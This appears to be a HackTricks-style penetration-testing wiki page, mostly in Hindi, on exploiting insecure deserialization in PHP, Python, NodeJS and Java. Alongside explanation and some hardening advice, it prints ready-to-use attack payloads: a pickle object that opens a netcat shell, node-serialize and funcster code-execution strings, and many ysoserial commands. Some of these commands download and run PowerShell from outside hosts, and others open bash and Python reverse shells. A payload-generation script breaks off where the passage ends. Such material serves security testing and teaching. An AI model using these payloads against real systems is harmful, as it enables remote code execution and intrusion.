# डेसिरियलाइज़ेशन

{{#include ../../banners/hacktricks-training.md}}

## मूल जानकारी

**सीरियलाइज़ेशन** उस विधि को कहते हैं जिसमें किसी object को ऐसे फ़ॉर्मेट में बदला जाता है जिसे संरक्षित किया जा सके, ताकि उसे स्टोर किया जा सके या संचार प्रक्रिया के हिस्से के रूप में प्रेषित किया जा सके। यह तकनीक सामान्यतः इस उद्देश्य के लिए प्रयोग की जाती है कि object को बाद में उसकी संरचना और स्थिति बनाए रखते हुए पुनः बनाया जा सके।

**डेसिरियलाइज़ेशन**, इसके विपरीत, वह प्रक्रिया है जो सीरियलाइज़ेशन का उल्टा करती है। इसमें किसी विशेष फ़ॉर्मेट में संरचित डेटा लेकर उसे पुनः एक object में पुनर्निर्मित किया जाता है।

डेसिरियलाइज़ेशन खतरनाक हो सकता है क्योंकि यह संभावित रूप से **हमलावरों को सीरियलाइज़्ड डेटा में हेरफेर करके हानिकारक कोड चलाने** या object की पुनर्निर्माण प्रक्रिया के दौरान एप्लिकेशन में अप्रत्याशित व्यवहार उत्पन्न करने की अनुमति दे सकता है।

## PHP

PHP में, सीरियलाइज़ेशन और डेसिरियलाइज़ेशन प्रक्रियाओं के दौरान कुछ विशिष्ट magic methods का उपयोग किया जाता है:

- `__sleep`: जब कोई object सीरियलाइज़ किया जा रहा होता है तो इसे बुलाया जाता है। यह method उन सभी properties के नामों की array वापस करनी चाहिए जिन्हें सीरियलाइज़ करना है। इसका आम उपयोग पेंडिंग डेटा कमिट करने या इसी तरह के क्लीनअप कार्य करने के लिए होता है।
- `__wakeup`: जब कोई object डेसिरियलाइज़ किया जा रहा होता है तो इसे बुलाया जाता है। इसे सीरियलाइज़ेशन के दौरान खोए हुए database कनेक्शनों को पुनर्स्थापित करने और अन्य पुनःप्रारंभ कार्यों के लिए उपयोग किया जाता है।
- `__unserialize`: जब कोई object डेसिरियलाइज़ किया जा रहा होता है, तो अगर यह मौजूद है तो इसे `__wakeup` की जगह बुलाया जाता है। यह `__wakeup` की तुलना में डेसिरियलाइज़ेशन प्रक्रिया पर अधिक नियंत्रण प्रदान करता है।
- `__destruct`: जब कोई object नष्ट होने वाला होता है या स्क्रिप्ट समाप्त हो रही होती है तो यह method बुलाया जाता है। यह सामान्यतः क्लीनअप कार्यों के लिए प्रयोग किया जाता है, जैसे फ़ाइल हैंडल या database कनेक्शनों को बंद करना।
- `__toString`: यह method किसी object को string के रूप में व्यवहार करने की अनुमति देता है। इसे फाइल पढ़ने या उसके भीतर के function calls के आधार पर अन्य कार्यों के लिए उपयोग किया जा सकता है, प्रभावी तौर पर object का पाठ्य रूप प्रदान करता है।
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
यदि आप परिणामों को देखें तो आप देखेंगे कि जब ऑब्जेक्ट को deserialized किया जाता है तो functions **`__wakeup`** और **`__destruct`** कॉल होते हैं। ध्यान दें कि कई ट्यूटोरियल्स में आप पाएँगे कि जब किसी attribute को प्रिंट करने की कोशिश की जाती है तो **`__toString`** function कॉल होता है, लेकिन स्पष्ट रूप से यह **अब ऐसा नहीं हो रहा है**।

> [!WARNING]
> यदि यह क्लास में लागू किया गया हो तो method **`__unserialize(array $data)`** को **`__wakeup()`** की जगह कॉल किया जाता है। यह आपको serialized डेटा को एक array के रूप में प्रदान करके ऑब्जेक्ट को unserialize करने की अनुमति देता है। आप इस method का उपयोग properties को unserialize करने और deserialization के दौरान आवश्यक किसी भी कार्य को करने के लिए कर सकते हैं।
>
> ```php
> class MyClass {
>    private $property;
>
>    public function __unserialize(array $data): void {
>        $this->property = $data['property'];
>        // Perform any necessary tasks upon deserialization.
>    }
> }
> ```

आप एक समझाया गया **PHP example here** पढ़ सकते हैं: [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/), यहाँ [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) या यहाँ [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP Deserial + Autoload Classes

आप arbitrary php files और अन्य चीज़ें लोड करने के लिए PHP autoload functionality का दुरुपयोग कर सकते हैं:


{{#ref}}
php-deserialization-+-autoload-classes.md
{{#endref}}

### Serializing Referenced Values

यदि किसी कारणवश आप किसी value को किसी **other serialized value के reference के रूप में** serialize करना चाहते हैं तो आप:
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### PHP Object Injection को रोकना `allowed_classes` के साथ

> [!INFO]
> `unserialize()` के **दूसरे argument** (the `$options` array) के लिए सपोर्ट **PHP 7.0** में जोड़ा गया था। पुराने वर्ज़न्स पर यह फ़ंक्शन केवल serialized string ही स्वीकार करता था, इसलिए यह नियंत्रित करना संभव नहीं था कि कौन‑सी classes instantiate हो सकती हैं।

`unserialize()` serialized stream के अंदर पाए जाने वाले हर **class** को **instantiate** करेगा जब तक कि ऐसा न बताया जाए। PHP 7 से यह व्यवहार [`allowed_classes`](https://www.php.net/manual/en/function.unserialize.php) option के साथ प्रतिबंधित किया जा सकता है:
```php
// NEVER DO THIS – full object instantiation
$object = unserialize($userControlledData);

// SAFER – disable object instantiation completely
$object = unserialize($userControlledData, [
'allowed_classes' => false    // no classes may be created
]);

// Granular – only allow a strict white-list of models
$object = unserialize($userControlledData, [
'allowed_classes' => [MyModel::class, DateTime::class]
]);
```
अगर **`allowed_classes` छोड़ा गया है _या_ कोड PHP < 7.0 पर चलता है**, तो यह कॉल **खतरनाक** हो जाती है क्योंकि एक attacker ऐसा payload तैयार कर सकता है जो magic methods जैसे `__wakeup()` या `__destruct()` का दुरुपयोग करके Remote Code Execution (RCE) हासिल कर सके।

#### वास्तविक उदाहरण: Everest Forms (WordPress) CVE-2025-52709

WordPress plugin **Everest Forms ≤ 3.2.2** ने helper wrapper के साथ defensive होने की कोशिश की, लेकिन legacy PHP versions को ध्यान में नहीं रखा:
```php
function evf_maybe_unserialize($data, $options = array()) {
if (is_serialized($data)) {
if (version_compare(PHP_VERSION, '7.1.0', '>=')) {
// SAFE branch (PHP ≥ 7.1)
$options = wp_parse_args($options, array('allowed_classes' => false));
return @unserialize(trim($data), $options);
}
// DANGEROUS branch (PHP < 7.1)
return @unserialize(trim($data));
}
return $data;
}
```
जो सर्वर अभी भी **PHP ≤ 7.0** चला रहे थे, उस दूसरी शाखा ने एक क्लासिक **PHP Object Injection** को जन्म दिया जब एक प्रशासक ने एक दुर्भावनापूर्ण form submission खोला। एक minimal exploit payload इस तरह दिख सकता है:
```
O:8:"SomeClass":1:{s:8:"property";s:28:"<?php system($_GET['cmd']); ?>";}
```
जैसे ही admin ने entry को देखा, object instantiated हुआ और `SomeClass::__destruct()` executed हो गया, जिससे arbitrary code execution हुआ।

**मुख्य निष्कर्ष**
1. हमेशा `unserialize()` कॉल करते समय `['allowed_classes' => false]` (या एक सख्त white-list) पास करें।
2. defensive wrappers का audit करें – वे अक्सर legacy PHP branches को भूल जाते हैं।
3. केवल **PHP ≥ 7.x** में अपग्रेड करना पर्याप्त नहीं है: विकल्प को स्पष्ट रूप से पास करना आवश्यक है।

---

### PHPGGC (ysoserial for PHP)

[**PHPGGC**](https://github.com/ambionics/phpggc) आपको PHP deserializations को abuse करने के लिए payloads generate करने में मदद कर सकता है।\
ध्यान दें कि कई मामलों में आप **application** के source code में **deserialization** को abuse करने का तरीका **नहीं** ढूंढ पाएंगे, पर आप external PHP extensions के code को **abuse** कर सकते हैं।\
इसलिए, यदि संभव हो तो सर्वर का `phpinfo()` चेक करें और **search on the internet** (यहाँ तक कि **PHPGGC** के **gadgets** पर भी) कोई संभावित gadget देखें जिसे आप abuse कर सकें।

### phar:// metadata deserialization

यदि आपने ऐसा LFI पाया है जो सिर्फ फाइल को पढ़ रहा है और उसके अंदर के php code को execute नहीं कर रहा है, उदाहरण के लिए functions जैसे _**file_get_contents(), fopen(), file() or file_exists(), md5_file(), filemtime() or filesize()**_ का उपयोग करते हुए। आप कोशिश कर सकते हैं कि **deserialization** को abuse किया जाए जो **reading** एक **file** के दौरान **phar** protocol का उपयोग करते समय होता है।\
अधिक जानकारी के लिए निम्नलिखित पोस्ट पढ़ें:


{{#ref}}
../file-inclusion/phar-deserialization.md
{{#endref}}

## Python

### **Pickle**

जब object unpickle होता है, फ़ंक्शन \_\_\_reduce\_\_\_ executed हो जाएगा।\
शोषण होने पर, server एक error लौटा सकता है।
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
Before checking the बायपास तकनीक, try using `print(base64.b64encode(pickle.dumps(P(),2)))` to generate an object that is compatible with python2 if you're running python3.

For more information about escaping from **pickle jails** check:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

### Yaml **&** jsonpickle

The following page present the technique to **abuse an unsafe deserialization in yamls** python libraries and finishes with a tool that can be used to generate RCE deserialization payload for **Pickle, PyYAML, jsonpickle and ruamel.yaml**:


{{#ref}}
python-yaml-deserialization.md
{{#endref}}

### Class Pollution (Python Prototype Pollution)


{{#ref}}
../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md
{{#endref}}

## NodeJS

### JS Magic Functions

JS **doesn't have "magic" functions** like PHP or Python that are going to be executed just for creating an object. But it has some **functions** that are **frequently used even without directly calling them** such as **`toString`**, **`valueOf`**, **`toJSON`**.\
अगर किसी deserialization का दुरुपयोग किया जाए तो आप इन functions को अन्य कोड चलाने के लिए समझौता कर सकते हैं (संभवतः prototype pollutions का दुरुपयोग करते हुए) और जब इन्हें कॉल किया जाएगा तो आप arbitrary code execute करवा सकते हैं।

Another **"magic" way to call a function** without calling it directly is by **compromising an object that is returned by an async function** (promise). Because, if you **transform** that **return object** in another **promise** with a **property** called **"then" of type function**, it will be **executed** just because it's returned by another promise. _अनुसरण करें_ [_**this link**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _अधिक जानकारी के लिए._
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise((resolve) => {
console.log("hello")
resolve()
})
return p
}

async function test_then() {
const p = new Promise((then) => {
console.log("hello")
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### `__proto__` and `prototype` pollution

यदि आप इस तकनीक के बारे में जानना चाहते हैं **तो निम्नलिखित ट्यूटोरियल देखें**:

{{#ref}}
nodejs-proto-prototype-pollution/
{{#endref}}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

यह लाइब्रेरी functions को serialize करने की अनुमति देती है। उदाहरण:
```javascript
var y = {
rce: function () {
require("child_process").exec("ls /", function (error, stdout, stderr) {
console.log(stdout)
})
},
}
var serialize = require("node-serialize")
var payload_serialized = serialize.serialize(y)
console.log("Serialized: \n" + payload_serialized)
```
यह **serialised object** इस तरह दिखेगा:
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
You can see in the example that when a function is serialized the `_$$ND_FUNC$$_` flag is appended to the serialized object.

Inside the file `node-serialize/lib/serialize.js` you can find the same flag and how the code is using it.

![](<../../images/image (351).png>)

![](<../../images/image (446).png>)

As you may see in the last chunk of code, **यदि flag मिला** `eval` is used to deserialize the function, so basically **user input `eval` function के अंदर इस्तेमाल हो रहा है**.

However, **केवल serialising** एक function **इसे execute नहीं करेगा** as it would be necessary that some part of the code is **calling `y.rce`** in our example and that's highly **असंभाव्य**.\
Anyway, you could just **modify the serialised object** **adding some parenthesis** in order to auto execute the serialized function when the object is deserialized.\
In the next chunk of code **आखिरी parenthesis पर ध्यान दें** and how the `unserialize` function will automatically execute the code:
```javascript
var serialize = require("node-serialize")
var test = {
rce: "_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()",
}
serialize.unserialize(test)
```
जैसा कि पहले बताया गया था, यह लाइब्रेरी `_$$ND_FUNC$$_` के बाद का कोड लेगी और `eval` का उपयोग करके इसे **निष्पादित करेगी**। इसलिए, **कोड को स्वतः निष्पादित करने** के लिए आप **function creation हटाने** वाला हिस्सा और अंतिम parenthesis हटा कर **सिर्फ एक JS oneliner चलाना** कर सकते हैं, जैसा कि निम्न उदाहरण में दिखाया गया है:
```javascript
var serialize = require("node-serialize")
var test =
"{\"rce\":\"_$$ND_FUNC$$_require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })\"}"
serialize.unserialize(test)
```
You can [**find here**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) **अधिक जानकारी** about how to exploit this कमज़ोरी.

### [funcster](https://www.npmjs.com/package/funcster)

एक महत्वपूर्ण पहलू यह है कि **funcster** में **मानक बिल्ट-इन ऑब्जेक्ट्स** अप्राप्य होते हैं; वे पहुंच योग्य स्कोप के बाहर होते हैं। यह प्रतिबंध उस कोड के निष्पादन को रोकता है जो बिल्ट-इन ऑब्जेक्ट्स पर मेथड्स कॉल करने की कोशिश करता है, जिससे `"ReferenceError: console is not defined"` जैसी exceptions होती हैं जब `console.log()` या `require(something)` जैसे कमांड्स उपयोग किए जाते हैं।

इस सीमा के बावजूद, एक विशिष्ट तरीके से ग्लोबल संदर्भ सहित सभी मानक बिल्ट-इन ऑब्जेक्ट्स तक पूर्ण पहुँच को बहाल करना संभव है। ग्लोबल context का सीधे लाभ उठा कर इस प्रतिबंध को बायपास किया जा सकता है। उदाहरण के लिए, पहुँच को निम्नलिखित snippet का उपयोग करके फिर से स्थापित किया जा सकता है:
```javascript
funcster = require("funcster")
//Serialization
var test = funcster.serialize(function () {
return "Hello world!"
})
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = {
__js_function: 'this.constructor.constructor("console.log(1111)")()',
}
funcster.deepDeserialize(desertest2)
var desertest3 = {
__js_function:
"this.constructor.constructor(\"require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });\")()",
}
funcster.deepDeserialize(desertest3)
```
**For**[ **more information read this source**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

पैकेज **serialize-javascript** को केवल serialization उद्देश्यों के लिए डिज़ाइन किया गया है और इसमें कोई इन-बिल्ट deserialization क्षमता नहीं है। उपयोगकर्ताओं की जिम्मेदारी है कि वे deserialization के लिए अपनी स्वयं की विधि लागू करें। serialized डेटा को deserializing करने के लिए आधिकारिक उदाहरण सीधे `eval` के उपयोग का सुझाव देता है:
```javascript
function deserialize(serializedJavascript) {
return eval("(" + serializedJavascript + ")")
}
```
यदि यह function objects को deserialize करने के लिए उपयोग किया जाता है तो आप **इसे आसानी से exploit** कर सकते हैं:
```javascript
var serialize = require("serialize-javascript")
//Serialization
var test = serialize(function () {
return "Hello world!"
})
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test =
"function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
**For**[ **more information read this source**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### Cryo library

In the following pages you can find information about how to abuse this library to execute arbitrary commands:

- [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
- [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

Java में, **deserialization callbacks deserialization की प्रक्रिया के दौरान निष्पादित होते हैं**। इस निष्पादन का लाभ ऐसे हमलावर उठा सकते हैं जो malicious payloads तैयार करते हैं जो इन callbacks को ट्रिगर करते हैं, जिससे संभावित हानिकारक कार्रवाइयों का निष्पादन हो सकता है।

### Fingerprints

#### White Box

Codebase में संभावित serialization vulnerabilities की पहचान करने के लिए खोजें:

- ऐसी क्लासें जो `Serializable` interface को implement करती हैं।
- `java.io.ObjectInputStream`, `readObject`, `readUnshare` फ़ंक्शन्स का उपयोग।

विशेष ध्यान दें:

- `XMLDecoder` का उपयोग जब पैरामीटर्स external users द्वारा परिभाषित किए गए हों।
- `XStream` का `fromXML` method, खासकर यदि XStream का version <= 1.46 हो, क्योंकि यह serialization issues के प्रति संवेदनशील हो सकता है।
- `ObjectInputStream` जो `readObject` method के साथ उपयोग हो।
- ऐसे मेथड्स के implementations जैसे `readObject`, `readObjectNodData`, `readResolve`, या `readExternal`।
- `ObjectInputStream.readUnshared`।
- सामान्य रूप से `Serializable` का उपयोग।

#### Black Box

Black Box परीक्षण के लिए, उन विशेष **signatures या "Magic Bytes"** की तलाश करें जो java serialized objects (जो `ObjectInputStream` से उत्पन्न होते हैं) को दर्शाते हैं:

- Hexadecimal pattern: `AC ED 00 05`.
- Base64 pattern: `rO0`.
- HTTP response headers जिनमें `Content-type` `application/x-java-serialized-object` पर सेट हो।
- Hexadecimal pattern indicating prior compression: `1F 8B 08 00`.
- Base64 pattern indicating prior compression: `H4sIA`.
- वेब फ़ाइलें जिनमें `.faces` extension और `faces.ViewState` parameter होता है। वेब एप्लिकेशन में इन पैटर्न का पता चलने पर [post about Java JSF ViewState Deserialization](java-jsf-viewstate-.faces-deserialization.md) में दिए गए विवरण के अनुसार जाँच करनी चाहिए।
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### कमजोर है या नहीं जाँचें

यदि आप **learn about how does a Java Deserialized exploit work** के बारे में जानना चाहते हैं तो आप [**Basic Java Deserialization**](basic-java-deserialization-objectinputstream-readobject.md), [**Java DNS Deserialization**](java-dns-deserialization-and-gadgetprobe.md), और [**CommonsCollection1 Payload**](java-transformers-to-rutime-exec-payload.md) को देख सकते हैं।

#### SignedObject-gated deserialization and pre-auth reachability

आधुनिक codebases कभी-कभी deserialization को `java.security.SignedObject` से wrap करती हैं और `getObject()` कॉल करने से पहले signature validate करती हैं (जो inner object को deserialize करता है)। यह arbitrary top-level gadget classes को रोकता है पर तब भी exploitable हो सकता है यदि attacker एक वैध signature प्राप्त कर ले (उदाहरण: private-key compromise या signing oracle)। अतिरिक्त रूप से, error-handling flows unauthenticated users के लिए session-bound tokens बना सकते हैं, जिससे सामान्यतः protected sinks pre-auth उजागर हो सकते हैं।

For a concrete case study with requests, IoCs, and hardening guidance, see:

{{#ref}}
java-signedobject-gated-deserialization.md
{{#endref}}

#### White Box Test

आप यह जांच सकते हैं कि क्या कोई application स्थापित है जिसमें ज्ञात vulnerabilities मौजूद हैं।
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
You could try to **check all the libraries** known to be vulnerable and that [**Ysoserial** ](https://github.com/frohoff/ysoserial)can provide an exploit for. Or you could check the libraries indicated on [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json).\
आप [**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector) का उपयोग संभावित gadget chains खोजने के लिए भी कर सकते हैं जिन्हें exploit किया जा सके।\
जब आप **gadgetinspector** चला रहे हों (build करने के बाद) तो उसके द्वारा दिखाए जा रहे ढेर सारे warnings/errors की परवाह न करें और इसे पूरा होने दें। यह सभी findings को _gadgetinspector/gadget-results/gadget-chains-year-month-day-hore-min.txt_ के अंतर्गत लिखेगा। कृपया ध्यान दें कि **gadgetinspector कोई exploit नहीं बनाएगा और यह false positives भी दिखा सकता है**।

#### Black Box Test

Burp extension [**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md) का उपयोग करके आप यह पहचान सकते हैं **कौन सी लाइब्रेरीज़ उपलब्ध हैं** (और यहाँ तक कि उनकी versions भी)। इस जानकारी के साथ किसी payload को चुनना व vulnerability को exploit करना **आसान** हो सकता है।\
[**Read this to learn more about GadgetProbe**](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**.**\
GadgetProbe का फोकस **`ObjectInputStream` deserializations** पर है।

Burp extension [**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner) का उपयोग करके आप ysoserial के साथ exploitable **vulnerable libraries** की पहचान कर सकते हैं और उन्हें **exploit** कर सकते हैं।\
[**Read this to learn more about Java Deserialization Scanner.**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
Java Deserialization Scanner का फोकस **`ObjectInputStream`** deserializations पर है।

आप [**Freddy**](https://github.com/nccgroup/freddy) का उपयोग भी Burp में deserializations vulnerabilities का पता लगाने के लिए कर सकते हैं। यह plugin केवल `ObjectInputStream` संबंधित vulnerabilities ही नहीं ढूंढेगा बल्कि **Json** और **Yml** deserialization libraries से आने वाली vulns को भी ढूंढेगा। एक्टिव मोड में यह उन्हें sleep या DNS payloads का उपयोग करके confirm करने की कोशिश करेगा।\
[**You can find more information about Freddy here.**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

**Serialization Test**

सिर्फ यह जाँचना कि सर्वर किसी vulnerable लाइब्रेरी का उपयोग कर रहा है, पूरी बात नहीं होती। कभी-कभी आप serialized object के अंदर के data को बदलकर कुछ checks bypass कर सकते हैं (शायद आपको किसी webapp में admin privileges दे दें)।\
यदि आप किसी web application को भेजा जा रहा java serialized object पाते हैं, तो आप [**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper) का उपयोग करके उस serialized object को और अधिक human readable फॉर्मैट में print कर सकते हैं जो भेजा जा रहा है। यह जानकर कि आप कौन सा data भेज रहे हैं, उसे modify करना और कुछ checks bypass करना आसान होगा।

### **Exploit**

#### **ysoserial**

The main tool to exploit Java deserializations is [**ysoserial**](https://github.com/frohoff/ysoserial) ([**download here**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)). You can also consider using [**ysoseral-modified**](https://github.com/pimps/ysoserial-modified) which will allow you to use complex commands (with pipes for example).\
Note that this tool is **focused** on exploiting **`ObjectInputStream`**.\
I would **start using the "URLDNS"** payload **before a RCE** payload to test if the injection is possible. Anyway, note that maybe the "URLDNS" payload is not working but other RCE payload is.
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
जब आप **java.lang.Runtime.exec()** के लिए payload बना रहे होते हैं, तो आप execution के output को redirect करने के लिए ">" या "|" जैसे special characters, commands execute करने के लिए "$()", या यहां तक कि spaces से अलग किए गए arguments को **pass** नहीं कर सकते (आप `echo -n "hello world"` तो कर सकते हैं लेकिन आप `python2 -c 'print "Hello world"'` नहीं कर पाएंगे)। payload को सही तरीके से encode करने के लिए आप [use this webpage](http://www.jackson-t.ca/runtime-exec-payloads.html).

नीचे दिए गए script का उपयोग करके आप Windows और Linux के लिए **all the possible code execution** payloads बना सकते हैं और फिर उन्हें vulnerable वेब पेज पर टेस्ट कर सकते हैं:
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
